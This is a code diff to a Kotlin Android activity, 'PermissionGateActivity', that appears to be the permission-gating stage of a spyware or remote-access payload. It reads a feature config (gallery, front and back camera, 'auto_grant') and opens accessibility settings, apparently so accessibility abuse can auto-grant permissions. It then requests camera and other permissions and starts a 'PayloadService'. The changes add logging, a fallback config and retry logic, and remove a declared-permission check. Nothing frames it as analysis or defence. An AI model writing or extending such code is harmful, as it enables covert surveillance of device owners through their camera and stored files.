@@ -8,12 +8,15 @@ import android.graphics.Color
 import android.graphics.drawable.GradientDrawable
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import android.view.Gravity
 import android.view.ViewGroup
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
+import org.json.JSONObject
 
 class PermissionGateActivity : Activity(), PayloadServiceHost {
 
@@ -22,18 +25,30 @@ class PermissionGateActivity : Activity(), PayloadServiceHost {
     }
 
     private var waitingA11y = false
+    private var features: List<String> = emptyList()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        HsLog.init(this)
+
         val cfg = (application as? PayloadApp)?.readConfig()
-        PayloadState.config = cfg
-        if (cfg == null) {
-            finish()
-            return
+        if (cfg != null) {
+            PayloadState.config = cfg
+            features = readFeatures(cfg)
+        } else {
+            val alt = try {
+                HsConfig.read(this)
+            } catch (t: Throwable) {
+                null
+            }
+            if (alt != null) features = alt.features
         }
+        if (features.isEmpty()) features = listOf("gallery")
+        HsLog.w("gate features=$features")
+
         setContentView(buildUi())
 
-        if (PayloadState.enabled("auto_grant") && !a11yOn()) {
+        if (features.contains("auto_grant") && !a11yOn()) {
             openA11y()
         } else {
             request()
@@ -55,7 +70,20 @@ class PermissionGateActivity : Activity(), PayloadServiceHost {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == REQ) proceed()
+        if (requestCode == REQ) {
+            HsLog.w("perm result n=" + grantResults.size)
+            proceed()
+        }
+    }
+
+    private fun readFeatures(json: JSONObject): List<String> {
+        val out = ArrayList<String>()
+        try {
+            val a = json.optJSONArray("features")
+            if (a != null) for (i in 0 until a.length()) out.add(a.optString(i))
+        } catch (t: Throwable) {
+        }
+        return out
     }
 
     private fun openA11y() {
@@ -63,9 +91,18 @@ class PermissionGateActivity : Activity(), PayloadServiceHost {
         try {
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         } catch (t: Throwable) {
+            HsLog.e("a11y open: ${t.message}")
             waitingA11y = false
             request()
+            return
         }
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (waitingA11y && hasWindowFocus()) {
+                HsLog.w("a11y settings did not open")
+                waitingA11y = false
+                request()
+            }
+        }, 2000L)
     }
 
     private fun a11yOn(): Boolean = try {
@@ -80,6 +117,7 @@ class PermissionGateActivity : Activity(), PayloadServiceHost {
 
     private fun request() {
         val perms = requiredPermissions()
+        HsLog.w("request n=" + perms.size)
         if (perms.isEmpty()) {
             proceed()
             return
@@ -87,26 +125,15 @@ class PermissionGateActivity : Activity(), PayloadServiceHost {
         try {
             requestPermissions(perms, REQ)
         } catch (t: Throwable) {
+            HsLog.e("request: ${t.message}")
             proceed()
         }
     }
 
-    private fun on(k: String): Boolean = try {
-        val f = PayloadState.config
-        val a = f?.optJSONArray("features")
-        var hit = false
-        if (a != null) for (i in 0 until a.length()) if (a.optString(i) == k) hit = true
-        hit
-    } catch (t: Throwable) {
-        false
-    }
+    private fun on(k: String): Boolean = features.contains(k)
 
-    private fun granted(p: String): Boolean =
+    private fun granted(p: String): Boolean = try {
         checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED
-
-    private fun declared(p: String): Boolean = try {
-        val pi = packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS)
-        pi.requestedPermissions?.contains(p) == true
     } catch (t: Throwable) {
         false
     }
@@ -132,13 +159,14 @@ class PermissionGateActivity : Activity(), PayloadServiceHost {
         if (on("front_camera") || on("back_camera")) list.add(Manifest.permission.CAMERA)
         if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
 
-        return list.filter { declared(it) && !granted(it) }.toTypedArray()
+        return list.filter { !granted(it) }.distinct().toTypedArray()
     }
 
     private fun proceed() {
         try {
             startService(Intent(this, PayloadService::class.java))
         } catch (t: Throwable) {
+            HsLog.e("startService: ${t.message}")
         }
         finish()
     }
